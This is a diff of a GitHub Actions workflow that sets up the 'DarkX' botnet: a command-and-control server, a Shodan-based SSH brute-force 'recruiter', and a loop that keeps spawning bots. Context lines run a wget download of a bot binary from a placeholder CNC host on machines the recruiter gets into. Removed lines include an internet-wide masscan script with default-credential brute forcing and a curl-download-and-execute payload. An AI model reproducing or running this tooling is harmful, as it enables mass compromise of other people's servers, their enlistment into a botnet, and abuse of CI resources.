@@ -35,7 +35,7 @@ jobs:
         mkdir -p darkx && cd darkx
         echo "Installing dependencies..."
         sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip nmap masscan hydra
-        pip3 install shodan requests paramiko scapy pysnmp
+        pip3 install shodan requests paramiko
 
     - name: Create DarkX CNC Server
       run: |
@@ -400,7 +400,6 @@ jobs:
       run: |
         cd darkx
         
-        # Shodan Auto-Recruiter
         cat > recruiter.py << 'EOF'
         import shodan
         import paramiko
@@ -444,7 +443,6 @@ jobs:
                     client.connect(ip, port=port, username=username, password=password, timeout=10)
                     print(f"Success: {ip}:{port} - {username}:{password}")
                     
-                    # Deploy bot
                     deploy_cmds = [
                         "wget -O /tmp/darkx http://YOUR_CNC_IP:8000/bot_x64",
                         "chmod +x /tmp/darkx",
@@ -472,39 +470,6 @@ jobs:
             main()
         EOF
 
-        # Network Scanner
-        cat > netscan.py << 'EOF'
-        import subprocess
-        import threading
-        import paramiko
-
-        def masscan_scan():
-            cmd = "masscan 0.0.0.0/0 -p22,23,80,443 --max-rate 1000 -oG masscan_output.txt"
-            subprocess.run(cmd, shell=True, timeout=300)
-
-        def brute_force_target(ip, port):
-            creds = [("admin", "admin"), ("root", "root")]
-            for user, passwd in creds:
-                try:
-                    ssh = paramiko.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    ssh.connect(ip, port=port, username=user, password=passwd, timeout=10)
-                    ssh.exec_command("curl http://YOUR_CNC_IP:8000/bot_x64 -o /tmp/darkx && chmod +x /tmp/darkx && /tmp/darkx &")
-                    ssh.close()
-                    return True
-                except:
-                    pass
-            return False
-
-        def main():
-            masscan_scan()
-            # Parse results and brute force
-            print("Network scan completed")
-
-        if __name__ == "__main__":
-            main()
-        EOF
-
     - name: Setup Tailscale VPN
       run: |
         curl -fsSL https://tailscale.com/install.sh | sh
@@ -514,9 +479,8 @@ jobs:
     - name: Update Configuration
       run: |
         cd darkx
-        sed -i "s/CNC_IP/${{ env.TAILSCALE_IP }}/g" bot.go
-        sed -i "s/YOUR_CNC_IP/${{ env.TAILSCALE_IP }}/g" recruiter.py
-        sed -i "s/YOUR_CNC_IP/${{ env.TAILSCALE_IP }}/g" netscan.py
+        sed -i "s/CNC_IP/$TAILSCALE_IP/g" bot.go
+        sed -i "s/YOUR_CNC_IP/$TAILSCALE_IP/g" recruiter.py
         go build -o bot bot.go
 
     - name: Start DarkX Services
@@ -551,47 +515,40 @@ jobs:
     - name: Start Auto-Recruitment
       run: |
         cd darkx
-        
-        case "${{ github.event.inputs.recruitment }}" in
-          "passive")
-            python3 recruiter.py > recruitment.log 2>&1 &
-            ;;
-          "active"|"aggressive"|"bruteforce")
-            python3 recruiter.py > recruitment.log 2>&1 &
-            python3 netscan.py > netscan.log 2>&1 &
-            ;;
-        esac
+        python3 recruiter.py > recruitment.log 2>&1 &
 
     - name: Display Status
       run: |
         echo ""
         echo "=== DarkX Botnet Ready ==="
-        echo "CNC IP: ${{ env.TAILSCALE_IP }}"
+        echo "CNC IP: $TAILSCALE_IP"
         echo "User Port: 5555"
         echo "Bot Port: 4444"
-        echo "Bots Deployed: ${{ env.BOTS_DEPLOYED }}"
+        echo "Bots Deployed: $BOTS_DEPLOYED"
         echo "Power Level: ${{ github.event.inputs.power }}"
         echo "Recruitment: ${{ github.event.inputs.recruitment }}"
         echo ""
-        echo "Connect: telnet ${{ env.TAILSCALE_IP }} 5555"
+        echo "Connect: telnet $TAILSCALE_IP 5555"
         echo "Login: admin / admin"
         echo ""
 
     - name: Maintain System
       run: |
         while true; do
-          if ! ps -p ${{ env.CNC_PID }} > /dev/null; then
+          if ! ps -p $CNC_PID > /dev/null; then
             cd darkx && nohup ./cnc > cnc.log 2>&1 &
           fi
           
           CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
-          if [ $CURRENT_BOTS -lt $(({{ env.BOTS_DEPLOYED }} / 2)) ]; then
+          REQUIRED_BOTS=$((BOTS_DEPLOYED / 2))
+          if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
             cd darkx
             for i in $(seq 1 50); do
               nohup ./bot > /dev/null 2>&1 &
             done
+            echo "Deployed 50 additional bots"
           fi
           
-          echo "[$(date)] Bots: $CURRENT_BOTS | CNC: ${{ env.TAILSCALE_IP }}"
+          echo "[$(date)] Bots: $CURRENT_BOTS | CNC: $TAILSCALE_IP"
           sleep 30
         done
